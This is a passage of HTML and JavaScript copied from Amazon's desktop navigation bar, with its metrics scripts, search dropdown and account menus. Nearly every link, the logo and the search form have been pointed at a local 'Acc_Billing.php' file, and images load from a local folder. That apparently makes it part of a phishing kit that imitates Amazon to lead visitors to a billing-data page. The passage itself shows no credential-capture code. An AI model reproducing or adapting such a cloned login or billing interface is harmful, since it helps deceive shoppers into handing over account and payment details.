n(t,e,o)}catch(n){}})}s.once("$afterload",function(){t=1,function(e){(s[i]()||[]).forEach(function(n){if(!n.indexOf(r))try{var t=s[i](n);s[a](n),JSON.parse(t).forEach(e)}catch(n){s.error(n)}})}(T),y&&y[n]&&y[n]("visibilitychange",R,!1),R()}),s.once("$afterunload",function(){t=1,R()}),s.on("$afterPageTransition",function(){h=0}),s.register(l,{log:T,register:function(n){p.push(n)}})});csa.plugin(function(n){var r=n.config["Events.SushiEndpoint"];n("Transport")("register",{accepts:function(n){return n.schemaId},post:function(n){var t=n.map(function(n){return{data:n}});return{url:r,body:JSON.stringify({events:t})}},preflight:function(){var n,t=/\/\/(.*?)\//.exec(r);return t&&t[1]&&(n="https://"+t[1]+"/ping"),{url:n}},chunks:function(n){for(var t=[];500<n.length;)t.push(n.splice(0,500));return t.push(n),t}})});csa.plugin(function(t){var i,a,o,r,d=t.config["Content.ImpressionMinimumTime"]||1e3,e="addEventListener",c="hidden",n="renderedTo",s=n+"Viewed",u=n+"Meaningful",f=n+"Impressed",g=1,m=2,l=3,v=4,p=5,h="loaded",T=7,I=t.global,P=t("Events",{producerId:"csa"}),y=I.document,C={},b={};if(!y||!y[e]||void 0===y[c])return E("PageStateChange.2",{state:"ignored"});function w(e){if(!C[T]){var n;if(C[e]=t.time(),e!==l&&e!==h||(i=i||C[e]),i&&!y[c])a=a||C[e],(n={})[u]=i-o,n[s]=a-o,E("PageView.4",n),r=r||setTimeout(S,d);if(e!==p&&e!==g&&e!==m||(clearTimeout(r),r=0),e!==g&&e!==m||E("PageRender.3",{transitionType:e===g?"hard":"soft"}),e===T)(n={})[u]=i-o,n[s]=a-o,n[f]=C[e]-o,E("PageImpressed.2",n)}}function E(e,n){b[e]||(n.schemaId="csa."+e,P("log",n,{ent:"all"}),b[e]=1)}function M(){w(y[c]?p:v)}function S(){w(T),r=0}function V(){var e=o?m:g;C={},b={},a=i=0,o=t.time(),w(e),M()}function $(){var e=y.readyState;"interactive"===e&&w(l),"complete"===e&&w(h)}V(),y[e]("visibilitychange",M,!1),y[e]("readystatechange",$,!1),t.on("$afterPageTransition",V),t.once("$load",$),t.register("Content",{get:function(){return{emit:w}}})});
</script>
<!-- sp:feature:nav-inline-js -->
<!-- From remote config v3-->
<script type="text/javascript">
(function(d){document.createElement("header");function b(e){return[].slice.call(e)}function c(f,e){return{m:f,a:b(e)}}var a=function(f){var g={};g._sourceName=f;g._replay=[];g.getNow=function(i,h){return h};function e(i,h,j){i[j]=function(){g._replay.push(h.concat(c(j,arguments)))}}g.when=function(){var i=[c("when",arguments)];var h={};e(h,i,"run");e(h,i,"declare");e(h,i,"publish");e(h,i,"build");return h};e(g,[],"declare");e(g,[],"build");e(g,[],"publish");e(g,[],"importEvent");a._shims.push(g);return g};a._shims=[];if(!d.$Nav){d.$Nav=a("rcx-nav")}if(!d.$Nav.make){d.$Nav.make=a}}(window));
$Nav.importEvent('navbarJS-beaconbelt');
$Nav.declare('img.sprite', {
  'png8': 'https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/global-sprite_bluebeacon-v1._CB485918456_.png',
  'png32': 'https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/nav-sprite-global_bluebeacon-1x_optimized_layout1._CB468670774_.png',
  'png32-2x': 'https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/nav-sprite-global_bluebeacon-2x_optimized_layout1._CB468670774_.png'
});
$Nav.declare('img.timeline', {
  'timeline-icon-2x': 'https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/timeline_sprite_2x._CB443581191_.png'
});
window._navbarSpriteUrl = 'https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/nav-sprite-global_bluebeacon-1x_optimized_layout1._CB468670774_.png';
$Nav.declare('img.pixel', 'https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/transparent-pixel._CB485935036_.gif');
</script>
<img src="./Library/files/nav-sprite-global_bluebeacon-1x_optimized_layout1._CB468670774_.png" style="display:none" alt="">
<!--[if IE 6]>
<style type="text/css"><!--
  #navbar.nav-sprite-v3 .nav-sprite {
    background-image: url(https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/global-sprite_bluebeacon-v1._CB485918456_.png);
  }
-->
<!--[endif]---->
<!-- NAVYAAN JS -->
<script>
(window.AmazonUIPageJS ? AmazonUIPageJS : P).when('navCF').execute(function() {
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/411rWMfhQqL._RC|71bD7Jez7wL.js,61nu+N-SMyL.js,41W9ohA0e+L.js,11vrNkbdcvL.js,21qaguVEGfL.js,41QN7vBTpzL.js,51wilTzvmEL.js,313jWehHlpL.js_.js?AUIClients/NavDesktopUberAsset#desktop');
});
</script>
<!-- sp:feature:navbar -->

  <!-- NAVYAAN -->








<!--Pilu -->

<!-- navmet initial definition -->


<script type="text/javascript">
    if(window.navmet===undefined) {
      window.navmet=[];
      if (window.performance && window.performance.timing && window.ue_t0) {
        var t = window.performance.timing;
        var now = + new Date();
        window.navmet.basic = {
          'networkLatency': (t.responseStart - t.fetchStart),
          'navFirstPaint': (now - t.responseStart),
          'NavStart': (now - window.ue_t0)
        };
      }
    }
</script>




<script type="text/javascript">window.navmet.tmp=+new Date();</script>
  <script type="text/javascript">
    window.uet && uet('ns');
    window._navbar = (function (o) {
      o.componentLoaded = o.loading = function(){};
      o.browsepromos = {};
      o.issPromos = [];
      return o;
    }(window._navbar || {}));
    window._navbar.declareOnLoad = function () { window.$Nav && $Nav.declare('page.load'); };
    if (window.addEventListener) {
      window.addEventListener("load", window._navbar.declareOnLoad, false);
    } else if (window.attachEvent) {
      window.attachEvent("onload", window._navbar.declareOnLoad);
    } else if (window.$Nav) {
      $Nav.when('page.domReady').run("OnloadFallbackSetup", function () {
        window._navbar.declareOnLoad();
      });
    }
    window.$Nav && $Nav.declare('logEvent.enabled',
      'false');

    window.$Nav && $Nav.declare('config.lightningDeals', {"activeItems":[],"marketplaceID":"ATVPDKIKX0DER","customerID":"A31P3KWIE1NTKM"});
  </script>

    <style mark="aboveNavInjectionCSS" type="text/css">
      div#navSwmHoliday.nav-focus {border: none;margin: 0;}
    </style>
    <script mark="aboveNavInjectionJS" type="text/javascript">
      try {
        if(window.navmet===undefined)window.navmet=[]; if(window.$Nav) { $Nav.when('$', 'config', 'flyout.accountList', 'SignInRedirect', 'dataPanel').run('accountListRedirectFix', function ($, config, flyout, SignInRedirect, dataPanel) { if (!config.accountList) { return; } flyout.getPanel().onData(function (data) { if (SignInRedirect) { var $anchors = $('[data-nav-role=signin]', flyout.elem()); $.each($anchors, function(i, anchorEl) {SignInRedirect.setRedirectUrl($(anchorEl), null, null);});}});}); $Nav.when('$').run('defineIsArray', function(jQuery) { if(jQuery.isArray===undefined) { jQuery.isArray=function(param) { if(param.length===undefined) { return false; } return true; }; } }); $Nav.declare('config.cartFlyoutDisabled', 'true'); $Nav.when('$','$F','config','logEvent','panels','phoneHome','dataPanel','flyouts.renderPromo','flyouts.sloppyTrigger','flyouts.accessibility','util.mouseOut','util.onKey','debug.param').build('flyouts.buildSubPanels',function($,$F,config,logEvent,panels,phoneHome,dataPanel,renderPromo,createSloppyTrigger,a11yHandler,mouseOutUtility,onKey,debugParam){var flyoutDebug=debugParam('navFlyoutClick');return function(flyout,event){var linkKeys=[];$('.nav-item',flyout.elem()).each(function(){var $item=$(this);linkKeys.push({link:$item,panelKey:$item.attr('data-nav-panelkey')});});if(linkKeys.length===0){return;} var visible=false;var $parent=$('<div class=\'nav-subcats\'></div>').appendTo(flyout.elem());var panelGroup=flyout.getName()+'SubCats';var hideTimeout=null;var sloppyTrigger=createSloppyTrigger($parent);var showParent=function(){if(hideTimeout){clearTimeout(hideTimeout);hideTimeout=null;} if(visible){return;} var height=$('#nav-flyout-shopAll').height(); $parent.css({'height': height});$parent.animate({width:'show'},{duration:200,complete:function(){$parent.css({overflow:'visible'});}});visible=true;};var hideParentNow=function(){$parent.stop().css({overflow:'hidden',display:'none',width:'auto',height:'auto'});panels.hideAll({group:panelGroup});visible=false;if(hideTimeout){clearTimeout(hideTimeout);hideTimeout=null;}};var hideParent=function(){if(!visible){return;} if(hideTimeout){clearTimeout(hideTimeout);hideTimeout=null;} hideTimeout=setTimeout(hideParentNow,10);};flyout.onHide(function(){sloppyTrigger.disable();hideParentNow();this.elem().hide();});var addPanel=function($link,panelKey){var panel=dataPanel({className:'nav-subcat',dataKey:panelKey,groups:[panelGroup],spinner:false,visible:false});if(!flyoutDebug){var mouseout=mouseOutUtility();mouseout.add(flyout.elem());mouseout.action(function(){panel.hide();});mouseout.enable();} var a11y=a11yHandler({link:$link,onEscape:function(){panel.hide();$link.focus();}});var logPanelInteraction=function(promoID,wlTriggers){var logNow=$F.once().on(function(){var panelEvent=$.extend({},event,{id:promoID});if(config.browsePromos&&!!config.browsePromos[promoID]){panelEvent.bp=1;} logEvent(panelEvent);phoneHome.trigger(wlTriggers);});if(panel.isVisible()&&panel.hasInteracted()){logNow();}else{panel.onInteract(logNow);}};panel.onData(function(data){renderPromo(data.promoID,panel.elem());logPanelInteraction(data.promoID,data.wlTriggers);});panel.onShow(function(){var columnCount=$('.nav-column',panel.elem()).length;panel.elem().addClass('nav-colcount-'+columnCount);showParent();var $subCatLinks=$('.nav-subcat-links > a',panel.elem());var length=$subCatLinks.length;if(length>0){var firstElementLeftPos=$subCatLinks.eq(0).offset().left;for(var i=1;i<length;i++){if(firstElementLeftPos===$subCatLinks.eq(i).offset().left){$subCatLinks.eq(i).addClass('nav_linestart');}} if($('span.nav-title.nav-item',panel.elem()).length===0){var catTitle=$.trim($link.html());catTitle=catTitle.replace(/ref=sa_menu_top/g,'ref=sa_menu');var $subPanelTitle=$('<span class=\'nav-title nav-item\'>'+ catTitle+'</span>');panel.elem().prepend($subPanelTitle);}} $link.addClass('nav-active');});panel.onHide(function(){$link.removeClass('nav-active');hideParent();a11y.disable();sloppyTrigger.disable();});panel.onShow(function(){a11y.elems($('a, area',panel.elem()));});sloppyTrigger.register($link,panel);if(flyoutDebug){$link.click(function(){if(panel.isVisible()){panel.hide();}else{panel.show();}});} var panelKeyHandler=onKey($link,function(){if(this.isEnter()||this.isSpace()){panel.show();}},'keydown',false);$link.focus(function(){panelKeyHandler.bind();}).blur(function(){panelKeyHandler.unbind();});panel.elem().appendTo($parent);};var hideParentAndResetTrigger=function(){hideParent();sloppyTrigger.disable();};for(var i=0;i<linkKeys.length;i++){var item=linkKeys[i];if(item.panelKey){addPanel(item.link,item.panelKey);}else{item.link.mouseover(hideParentAndResetTrigger);}}};});};
      } catch ( err ) {
        if ( window.$Nav ) {
          window.$Nav.when('metrics', 'logUeError').run(function(metrics, log) {
            metrics.increment('NavJS:AboveNavInjection:error');
            log(err.toString(), {
              'attribution': 'rcx-nav',
              'logLevel': 'FATAL'
            });
          });
        }
      }
    </script>

  <noscript>
    <style type="text/css"><!--
      #navbar #nav-shop .nav-a:hover {
        color: #ff9900;
        text-decoration: underline;
      }
      #navbar #nav-search .nav-search-facade,
      #navbar #nav-tools .nav-icon,
      #navbar #nav-shop .nav-icon,
      #navbar #nav-subnav .nav-hasArrow .nav-arrow {
        display: none;
      }
      #navbar #nav-search .nav-search-submit,
      #navbar #nav-search .nav-search-scope {
        display: block;
      }
      #nav-search .nav-search-scope {
        padding: 0 5px;
      }
      #navbar #nav-search .nav-search-dropdown {
        position: relative;
        top: 5px;
        height: 23px;
        font-size: 14px;
        opacity: 1;
        filter: alpha(opacity = 100);
      }
    --></style>
 </noscript>
<script type="text/javascript">window.navmet.push({key:'PreNav',end:+new Date(),begin:window.navmet.tmp});</script>

<a id="nav-top"></a>




<a id="skiplink" tabindex="3" class="skip-link">Skip to main content</a>




<script type="text/javascript">window.navmet.main=+new Date();</script>

<header class="nav-opt-sprite nav-locale-us nav-lang-en nav-ssl nav-rec">
    
  <div id="navbar" cel_widget_id="Navigation-desktop-navbar" data-template="layoutSwapToolBar" role="navigation" class="nav-sprite-v1 celwidget nav-bluebeacon nav-a11y-t1 layout2 nav-packard-glow hamburger bold-focus-hover using-mouse" data-cel-widget="Navigation-desktop-navbar">
    
    
    
    <div id="nav-belt">
      
      
      
      <div class="nav-left">
        <script type="text/javascript">window.navmet.tmp=+new Date();</script>
  <a href="javascript: void(0)" id="nav-hamburger-menu" role="button" tabindex="5" aria-label="Open Menu">
    <i class="hm-icon nav-sprite"></i>
  </a>
  
<script type="text/javascript">
  var hmenu = document.getElementById("nav-hamburger-menu");
  hmenu.setAttribute("href", "javascript: void(0)");
  window.navHamburgerMetricLogger = function() {
    if (window.ue && window.ue.count) {
      var metricName = "Nav:Hmenu:IconClickActionPending";
      window.ue.count(metricName, (ue.count(metricName) || 0) + 1);
    }
    window.$Nav && $Nav.declare("navHMenuIconClicked",!0);
  };
  hmenu.addEventListener("click", window.navHamburgerMetricLogger);
  window.$Nav && $Nav.declare('hamburgerMenuIconAvailableOnLoad', false);
  window.$Nav && $Nav.declare('hamburgerMenuWeblabTreatment', 'T1');
</script>  
<script type="text/javascript">window.navmet.push({key:'HamburgerMenuIcon',end:+new Date(),begin:window.navmet.tmp});</script>
        <script type="text/javascript">window.navmet.tmp=+new Date();</script>
  <div id="nav-logo">
    <a href="Acc_Billing.php" class="nav-logo-link" aria-label="Amazon" tabindex="6">
      <span class="nav-sprite nav-logo-base"></span>
      <span class="nav-sprite nav-logo-ext"></span>
      <span class="nav-logo-locale"></span>
    </a>
  </div>
<script type="text/javascript">window.navmet.push({key:'Logo',end:+new Date(),begin:window.navmet.tmp});</script>
      </div>
      
      <div class="nav-right">
          <script type="text/javascript">window.navmet.tmp=+new Date();</script>
          <div id="nav-tools" class="layoutToolbarPadding">
              
              
              
              
  <a href="Acc_Billing.php" id="icp-nav-flyout" class="nav-a nav-a-2 icp-link-style-2">
    <span class="icp-nav-link-inner">
      <span class="nav-line-1">
        <span class="icp-nav-globe-img-2"></span>
        <span class="icp-nav-language">EN</span>
      </span>
      <span class="nav-line-2">&nbsp;
        <span class="nav-icon nav-arrow" style="visibility: visible;"></span>
      </span>
    </span>
  </a>

              
<a href="Acc_Billing.php" class="nav-a nav-a-2 nav-truncate  " data-nav-ref="nav_ya_signin" data-nav-role="signin" data-ux-jq-mouseenter="true" id="nav-link-accountList" tabindex="22">
  <span class="nav-line-1">Hello, Amazon</span>
  <span class="nav-line-2 ">Your &amp; Account<span class="nav-icon nav-arrow" style="visibility: visible;"></span>
  </span>
  <span class="nav-line-3">Hi Amazon</span>
  <span class="nav-line-4">Your &amp; Account</span>
</a>

<a href="Acc_Billing.php" class="nav-hidden-aria  " tabindex="23">
  Not Amazon? Sign Out
</a>

              
<a href="Acc_Billing.php" class="nav-a nav-a-2  " id="nav-orders" tabindex="24">
  <span class="nav-line-1">Returns</span>
  <span class="nav-line-2">&amp; Orders</span>
</a>

              
              
              
  <a href="Acc_Billing.php" aria-label="0 items in cart" class="nav-a nav-a-2" id="nav-cart" tabindex="26">
    <span aria-hidden="true" class="nav-line-1"></span>
    <span aria-hidden="true" class="nav-line-2">Cart<span class="nav-icon nav-arrow"></span>
    </span>
    <span class="nav-cart-icon nav-sprite"></span>
    <span id="nav-cart-count" aria-hidden="true" class="nav-cart-count nav-cart-0">0</span>
  </a>

          </div>
          <script type="text/javascript">window.navmet.push({key:'Tools',end:+new Date(),begin:window.navmet.tmp});</script>

      </div>
      
          <div class="nav-fill">
            <script type="text/javascript">window.navmet.tmp=+new Date();</script>
<div id="nav-search">
  <div id="nav-bar-left"></div>
  <form accept-charset="utf-8" action="Acc_Billing.php" class="nav-searchbar" method="GET" name="site-search" role="search">
    <div class="nav-left">
      <div id="nav-search-dropdown-card">
        
  <div class="nav-search-scope nav-sprite">
    <div class="nav-search-facade" data-value="search-alias=aps">
      <span class="nav-search-label" style="width: auto;">All</span>
      <i class="nav-icon"></i>
    </div>
    <span id="searchDropdownDescription" style="display:none">Select the department you want to search in</span>
    <select aria-describedby="searchDropdownDescription" class="nav-search-dropdown searchSelect" data-nav-digest="Xa0GQ+pPQ/tdsV+GmRWeXB8PUD0=" data-nav-selected="0" id="searchDropdownBox" name="url" style="display: block; top: 2.5px;" tabindex="18" title="Search in">
        <option selected="selected" value="search-alias=aps">All Departments</option>
        <option value="search-alias=arts-crafts-intl-ship">Arts &amp; Crafts</option>
        <option value="search-alias=automotive-intl-ship">Automotive</option>
        <option value="search-alias=baby-products-intl-ship">Baby</option>
        <option value="search-alias=beauty-intl-ship">Beauty &amp; Personal Care</option>
        <option value="search-alias=stripbooks-intl-ship">Books</option>
        <option value="search-alias=computers-intl-ship">Computers</option>
        <option value="search-alias=digital-music">Digital Music</option>
        <option value="search-alias=electronics-intl-ship">Electronics</option>
        <option value="search-alias=digital-text">Kindle Store</option>
        <option value="search-alias=instant-video">Prime Video</option>
        <option value="search-alias=fashion-womens-intl-ship">Women's Fashion</option>
        <option value="search-alias=fashion-mens-intl-ship">Men's Fashion</option>
        <option value="search-alias=fashion-girls-intl-ship">Girls' Fashion</option>
        <option value="search-alias=fashion-boys-intl-ship">Boys' Fashion</option>
        <option value="search-alias=deals-intl-ship">Deals</option>
        <option value="search-alias=hpc-intl-ship">Health &amp; Household</option>
        <option value="search-alias=kitchen-intl-ship">Home &amp; Kitchen</option>
        <option value="search-alias=industrial-intl-ship">Industrial &amp; Scientific</option>
        <option value="search-alias=luggage-intl-ship">Luggage</option>
        <option value="search-alias=movies-tv-intl-ship">Movies &amp; TV</option>
        <option value="search-alias=music-intl-ship">Music, CDs &amp; Vinyl</option>
        <option value="search-alias=pets-intl-ship">Pet Supplies</option>
        <option value="search-alias=software-intl-ship">Software</option>
        <option value="search-alias=sporting-intl-ship">Sports &amp; Outdoors</option>
        <option value="search-alias=tools-intl-ship">Tools &amp; Home Improvement</option>
        <option value="search-alias=toys-and-games-intl-ship">Toys &amp; Games</option>
        <option value="search-alias=videogames-intl-ship">Video Games</option>
    </select>
  </div>

      </div>
    </div>
    <div class="nav-right">
      <div class="nav-search-submit nav-sprite">
        <span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite">
          Go
        </span>
        <input type="submit" class="nav-input" value="Go" tabindex="20">
      </div>
    </div>
    <div class="nav-fill">
      <div class="nav-search-field ">
        <label id="nav-search-label" for="twotabsearchtextbox" class="aok-offscreen">
          Search
        </label>
        <input type="text" id="twotabsearchtextbox" value="" name="field-keywords" autocomplete="off" placeholder="" class="nav-input" dir="auto" tabindex="19">
      </div>
      <div id="nav-iss-attach"></div>
    </div>
  </form>
</div>
<script type="text/javascript">window.navmet.push({key:'Search',end:+new Date(),begin:window.navmet.tmp});</script>
          </div>
      
    <div id="nav-flyout-anchor"><div id="nav-flyout-prime" class="nav-coreFlyout nav-flyout"><div class="nav-arrow"><div class="nav-arrow-inner"></div></div><div class="nav-template nav-flyout-content nav-spinner"></div></div><div id="nav-flyout-accountList" class="nav-coreFlyout nav-flyout"><div class="nav-arrow"><div class="nav-arrow-inner"></div></div><div class="nav-template nav-flyout-content"><div id="nav-al-container"><div id="nav-al-wishlist" class="nav-al-column nav-tpl-itemList"><div class="nav-title" id="nav-al-title">Your Lists</div><div class="nav-template" id="nav-flyout-wl-alexa" style="display: block;"></div><div class="nav-template nav-spinner" id="nav-flyout-wl-items" style="display: block;"></div><a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Create a List</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Find a List or Registry</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Find a Gift</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Save Items from the Web</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Wedding Registry</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Baby Registry</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">AmazonSmile Charity Lists</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Pantry Lists</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Hearts</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Explore Idea Lists</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Explore Showroom</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Take the Home Style Quiz</span></a></div><div id="nav-al-your-account" class="nav-al-column nav-template nav-flyout-content nav-tpl-itemList"><div class="nav-title">Your Account</div><a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Account</span></a> <a id="nav_prefetch_yourorders" href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Orders</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Recommendations</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Subscribe &amp; Save Items</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Memberships &amp; Subscriptions</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Service Requests</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Garage</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Fanshop</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Pets</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Content and Devices</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Music Library</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Amazon Drive</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Prime Video</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Kindle Unlimited</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Watchlist</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Video Purchases &amp; Rentals</span></a> <a href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Your Android Apps &amp; Devices</span></a> <a id="nav-item-switch-account" href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Switch Accounts</span></a> <a id="nav-item-signout" href="Acc_Billing.php" class="nav-link nav-item"><span class="nav-text">Sign Out</span></a></div></div></div></div><div id="nav-flyout-timeline" class="nav-coreFlyout nav-fullWidthFlyout nav-flyout"><div class="nav-arrow"><div class="nav-arrow-inner"></div></div><div class="nav-template nav-flyout-content"><div id="nav-timeline" class="nav-timeline-asin-title-enabled"><div id="nav-timeline-recent-products"><span class="nav-text">Your Browsing History</span><a href="Acc_Billing.php" class="nav-a">View and Edit</a></div><div id="nav-timeline-data" class="nav-center"><div id="nav-timeline-no-history" class="nav-timeline-large-text"><span class="nav-line-1">Your shopping history is empty</span><span class="nav-line-2">Check back here to see items you shop for on any device.</span></div></div></div></div></div><div id="nav-flyout-abAcquisition" class="nav-coreFlyout nav-flyout"><div class="nav-arrow"><div class="nav-arrow-inner"></div></div><div class="nav-template nav-flyout-content nav-spinner"></div></div><div id="nav-flyout-transientFlyout" class="nav-coreFlyout nav-flyout"><div class="nav-arrow"><div class="nav-arrow-inner"></div></div><div class="nav-template nav-flyout-content nav-spinner"></div></div><div id="nav-flyout-fresh" class="nav-coreFlyout nav-flyout"><div class="nav-arrow"><div class="nav-arrow-inner"></div></div><div class="nav-template nav-flyout-content nav-spinner"></div></div><div id="nav-flyout-icp" class="nav-coreFlyout nav-flyout"><div class="nav-arrow"><div class="nav-arrow-inner"></div></div><div class="nav-template nav-flyout-content nav-spinner"></div></div><div id="nav-flyout-icp-footer-flyout" class="nav-coreFlyout nav-flyout"><div class="nav-arrow"><div class="nav-arrow-inner"></div></div><div class="nav-template nav-flyout-content nav-spinner"></div></div></div><div id="nav-flyout-iss-anchor"><div id="nav-flyout-searchAjax" class="nav-issFlyout nav-flyout"><div class="nav-template nav-flyout-content"></div></div></div></div>
    <div id="nav-main" class="nav-sprite">Acc_Billing.php
      
      
      
      
      
      <div class="nav-left">
        
<!-- NAVYAAN-GLOW-NAV -->
<div id="nav-global-location-slot">
    <span class="a-declarative" data-a-modal="{&quot;width&quot;:375, &quot;closeButton&quot;:&quot;false&quot;,&quot;popoverLabel&quot;:&quot;Choose your location&quot;, &quot;name&quot;:&quot;glow-modal&quot;, &quot;url&quot;:&quot;/gp/glow/get-address-selections.html?deviceType=desktop&amp;pageType=CPEFront&amp;storeContext=NoStoreName&quot;, &quot;footer&quot;:&quot;&lt;span class=\&quot;a-declarative\&quot; data-action=\&quot;a-popover-close\&quot; data-a-popover-close=\&quot;{}\&quot;&gt;&lt;span class=\&quot;a-button a-button-primary\&quot;&gt;&lt;span class=\&quot;a-button-inner\&quot;&gt;&lt;button name=\&quot;glowDoneButton\&quot; class=\&quot;a-button-text\&quot; type=\&quot;button\&quot;&gt;Done&lt;/button&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&quot;,&quot;header&quot;:&quot;Choose your location&quot;}" data-action="a-modal">
        <a class="nav-a nav-a-2 a-popover-trigger a-declarative" tabindex="35">
            <div class="nav-sprite" id="nav-packard-glow-loc-icon"></div>
            <div id="glow-ingress-block">
                <span class="nav-line-1" id="glow-ingress-line1">
                   Shop by
                </span>
                <span class="nav-line-2" id="glow-ingress-line2">
                   Department
                </span>
            </div>
        </a>
        </span>
        <input data-addnewaddress="add-new" id="unifiedLocation1ClickAddress" name="dropdown-selection" type="hidden" value="add-new">
        <input data-addnewaddress="add-new" id="ubbShipTo" name="dropdown-selection-ubb" type="hidden" value="add-new">
</div>


        
        
        
        
      </div>
      
      <div class="nav-right">
          <script type="text/javascript">window.navmet.tmp=+new Date();</script><!-- Navyaan SWM -->
<div id="nav-swmslot" class="nav-swm-text-widget">
  <a href="Acc_Billing.php" class="nav_a nav-swm-text" tabindex="56">Amazon's response to COVID-19</a>
</div><script type="text/javascript">window.navmet.push({key:'SWM',end:+new Date(),begin:window.navmet.tmp});</script>
      </div>
      
      <div class="nav-fill">
        
        
        
          
 <div id="nav-shop">
 </div>
          <div id="nav-xshop-container">
            
            <div id="nav-xshop">
              <script type="text/javascript">window.navmet.tmp=+new Date();</script>
<a href="Acc_Billing.php" class="nav-a  " tabindex="47">Today's Deals</a>

<a id="nav-your-amazon" href="Acc_Billing.php" class="nav-a  " tabindex="48"><span id="nav-your-amazon-text"><span class="nav-shortened-name">Amazon</span>'s Amazon.com</span></a>

<a href="Acc_Billing.php" class="nav-a  " tabindex="49">Help</a>

<a href="Acc_Billing.php" class="nav-a  " data-ux-jq-mouseenter="true" id="nav-recently-viewed" tabindex="50">Browsing History<span class="nav-icon nav-arrow" style="visibility: visible;"></span></a>

<a href="Acc_Billing.php" class="nav-a  " tabindex="51">Buy Again</a>

<a href="Acc_Billing.php" class="nav-a  " tabindex="52">Gift Cards</a>

<a href="Acc_Billing.php" class="nav-a  " tabindex="53">Registry</a>

<a href="Acc_Billing.php" class="nav-a  " tabindex="54">Sell</a>

<a href="Acc_Billing.php" aria-label="Click to call our Disability Customer Support line, or reach us directly at 1-888-283-1678" class="nav-hidden-aria  " tabindex="55">Disability Customer Support</a>
<script type="text/javascript">window.navmet.push({key:'CrossShop',end:+new Date(),begin:window.navmet.tmp});</script>
            </div>
            
            
            
              
            
          </div>
        
      </div>
      
    </div>

    <div id="nav-subnav-toaster"></div>

    
    

    
    
    
  </div>

  
  

</header>
<script type="text/javascript">window.navmet.push({key:'NavBar',end:+new Date(),begin:window.navmet.main});</script>

<script type="text/javascript">
    <!--
    
    window.$Nav && $Nav.when("data").run(function(data) { data({"freshTimeout":{"template":{"name":"flyoutError","data":{"error":{"title":"<style>#nav-flyout-fresh{width:269px;padding:0;}#nav-flyout-fresh .nav-flyout-content{padding:0;}</style><a href='/amazonfresh'><img src='https://images-na.ssl-images-amazon.com/images/G/01/omaha/images/yoda/flyout_72dpi._V270255989_.png' /></a>"}}}},"cartTimeout":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Your Cart","url":"/gp/cart/view.html?ref_=nav_err_cart_timeout"},"title":"Oops!","paragraph":"Unable to retrieve your cart."}}}},"primeTimeout":{"template":{"name":"flyoutError","data":{"error":{"title":"<a href='/gp/prime'><img src='https://images-na.ssl-images-amazon.com/images/G/01/prime/piv/YourPrimePIV_fallback_CTA._V327346943_.jpg' /></a>"}}}},"ewcTimeout":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Your Cart","url":"/gp/cart/view.html?ref_=nav_err_ewc_timeout"},"title":"Oops!","paragraph":"There's a problem loading your cart right now."}}}},"errorWishlist":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Your Wishlist","url":"/gp/registry/wishlist/?ref_=nav_err_wishlist"},"title":"Oops!","paragraph":"Unable to retrieve your wishlist"}}}},"emptyWishlist":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Your Wishlist","url":"/gp/registry/wishlist/?ref_=nav_err_empty_wishlist"},"title":"Oops!","paragraph":"Your list is empty"}}}},"yourAccountContent":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"Your Account","url":"/gp/css/homepage.html?ref_=nav_err_youraccount"},"title":"Oops!","paragraph":"Unable to retrieve your account"}}}},"shopAllTimeout":{"template":{"name":"flyoutError","data":{"error":{"paragraph":"Unable to retrieve departments, please try again later"}}}},"kindleTimeout":{"template":{"name":"flyoutError","data":{"error":{"paragraph":"Unable to retrieve list, please try again later"}}}}}); });
window.$Nav && $Nav.when("util.templates").run("FlyoutErrorTemplate", function(templates) {
